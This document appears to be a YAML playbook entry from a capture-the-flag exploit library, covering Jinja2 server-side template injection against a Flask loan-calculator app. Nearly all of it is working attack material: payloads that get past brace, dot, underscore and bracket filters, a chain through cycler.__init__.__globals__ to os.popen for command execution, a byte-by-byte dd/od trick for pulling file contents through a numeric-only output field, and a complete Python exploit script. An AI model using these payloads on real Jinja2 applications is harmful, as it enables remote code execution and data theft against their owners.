name: jinja2_ssti_encoding_bypass
category: web
tags: [ssti, jinja2, flask, filter_bypass, encoding, rce]
indicators:
  - "Jinja2 template with user input"
  - "Blacklist filtering: {{, }}, [, ], _, ."
  - "Output validation requiring numeric format"
  - "Default credentials (test:test)"
  - "render_template_string with f-string interpolation"

tricks:
  - name: "Step 1: Login with default credentials"
    when: "Found login form"
    how: "Use test:test to authenticate"
    payload: |
      POST /login
      Content-Type: application/x-www-form-urlencoded
      
      username=test&password=test

  - name: "Step 2: Bypass {{ }} filter"
    when: "{{ and }} are blacklisted"
    how: "Use {% print %} or {% set %} instead"
    payload: |
      # Instead of: {{ 7*7 }}
      # Use: {%print 7*7%}
      
      # Result: 49

  - name: "Step 3: Bypass . (dot) filter"
    when: "Dot notation is blacklisted"
    how: "Use |attr() filter instead"
    payload: |
      # Instead of: request.args
      # Use: request|attr('args')
      
      # Instead of: obj.method()
      # Use: obj|attr('method')()

  - name: "Step 4: Bypass _ (underscore) filter"
    when: "Underscore is blacklisted"
    how: "Pass __ via request.args parameter"
    payload: |
      # Pass u=__ as URL parameter
      # Then use: request|attr('args')|attr('get')('u')
      
      {%set u=request|attr('args')|attr('get')('u')%}
      # Now u contains "__"
      # Use: u~'init'~u to construct "__init__"

  - name: "Step 5: Bypass [ ] filter"
    when: "Square brackets are blacklisted"
    how: "Use |attr('__getitem__')(index) instead"
    payload: |
      # Instead of: obj['key']
      # Use: obj|attr('__getitem__')('key')
      
      # With underscore bypass:
      # obj|attr(u~'getitem'~u)('key')

  - name: "Step 6: RCE via cycler.__init__.__globals__"
    when: "Need to execute commands"
    how: "Access os module through cycler's globals"
    payload: |
      {%set u=request|attr('args')|attr('get')('u')%}
      {%set cmd=request|attr('args')|attr('get')('cmd')%}
      {%set c=cycler|attr(u~'init'~u)|attr(u~'globals'~u)%}
      {%set o=c|attr(u~'getitem'~u)('os')%}
      {%set x=o|attr('popen')(cmd)|attr('read')()%}
      {%print x|length%}
      
      # URL: ?principal=PAYLOAD&u=__&cmd=cat /flag

  - name: "Step 7: Bypass numeric output validation"
    when: "Output must be numeric only"
    how: "Use |length for string length, or extract char-by-char with shell commands"
    payload: |
      # Get string length:
      {%print x|length%}
      
      # Extract single char ASCII via shell:
      # dd if=/flag bs=1 count=1 skip=N 2>/dev/null | od -An -tu1 | tr -d ' '
      
      # This outputs the ASCII code of the Nth character
      # Loop through all characters to reconstruct the flag

  - name: "Complete exploit flow"
    when: "Need full exploitation"
    how: "Combine all bypasses"
    payload: |
      import requests
      import json
      
      session = requests.Session()
      session.post(target + '/login', data={'username': 'test', 'password': 'test'})
      
      # Get flag length
      payload_len = "{%set u=request|attr('args')|attr('get')('u')%}{%set cmd=request|attr('args')|attr('get')('cmd')%}{%set c=cycler|attr(u~'init'~u)|attr(u~'globals'~u)%}{%set o=c|attr(u~'getitem'~u)('os')%}{%set x=o|attr('popen')(cmd)|attr('read')()%}{%print x|length%}"
      
      params = {'principal': payload_len, 'payment': 100, 'term': 12, 'u': '__', 'cmd': 'cat /flag'}
      resp = session.get(target + '/total_loan_payments', params=params)
      flag_len = int(json.loads(resp.text.strip())['loan_principal'])
      
      # Extract each character
      flag = ''
      for i in range(flag_len):
          cmd = f"dd if=/flag bs=1 count=1 skip={i} 2>/dev/null | od -An -tu1 | tr -d ' '"
          params['cmd'] = cmd
          resp = session.get(target + '/total_loan_payments', params=params)
          char_ord = int(json.loads(resp.text.strip())['loan_principal'])
          flag += chr(char_ord)
      
      print(flag)

